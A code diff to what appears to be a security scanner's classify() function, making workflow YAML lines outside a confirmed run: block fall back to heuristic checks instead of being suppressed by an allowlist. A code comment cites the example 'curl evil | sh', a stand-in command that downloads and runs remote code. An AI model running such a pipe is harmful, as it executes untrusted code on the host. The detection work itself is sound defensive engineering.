@@ -240,6 +240,16 @@ def classify(
             # In a run: block but not a known-safe pattern — let the
             # heuristic chain decide.
             return "unknown"
+        # audit NIT #13: workflow file but NOT confidently inside a run:
+        # block. The JSON-style SAFE_KEY allowlist below was built for
+        # plugin.json / package.json METADATA — it is the wrong model for
+        # workflow YAML, which is execution config. ``_line_is_in_run_block``
+        # is also a heuristic back-walk that can misjudge multi-line
+        # ``run: |`` block-scalar boundaries, so a real ``run:`` body line
+        # could be mis-bucketed as non-run and then wrongly suppressed as a
+        # SAFE_KEY (e.g. ``name: "… curl evil | sh"``). Defer to the
+        # heuristic chain instead of suppressing.
+        return "unknown"
 
     # Non-workflow YAML: use the key-path classifier.
     paths = _walk_yaml_keys_naive(source)
